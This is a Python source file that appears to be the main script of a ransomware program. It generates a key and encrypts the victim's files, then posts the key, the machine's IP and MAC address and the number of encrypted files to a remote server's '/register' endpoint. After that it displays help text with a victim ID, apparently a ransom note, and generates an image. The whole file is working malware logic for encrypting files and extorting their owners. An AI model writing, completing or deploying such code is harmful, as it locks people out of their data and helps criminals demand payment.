import requests
from encrypter import KeyGenerator
from device_infos import get_ip_address, get_mac_address
from generate_image import generate_image
from help_text import help_text
from env import BASE_API_URL
from encrypt import Encrypt


def _format_data(encryption_key : bytes, encrypted_files : int):
    return {
        'ip': get_ip_address(),
        'macAddress': get_mac_address(),
        'encryptionKey': encryption_key.decode('utf-8'),
        'encryptedFiles': encrypted_files
    }


def main():
    encryption_key = KeyGenerator().generateKey()

    if encryption_key is not None:
        encrypt = Encrypt()
        _encrypted_files = encrypt.process(encryption_key)
  
        response = requests.post(BASE_API_URL + '/register', json = _format_data(encryption_key=encryption_key, encrypted_files=_encrypted_files))

        if response.status_code == 200:
            uuid = response.json()
            help_text(uuid)
        
    generate_image()


if __name__ == "__main__":
    main()
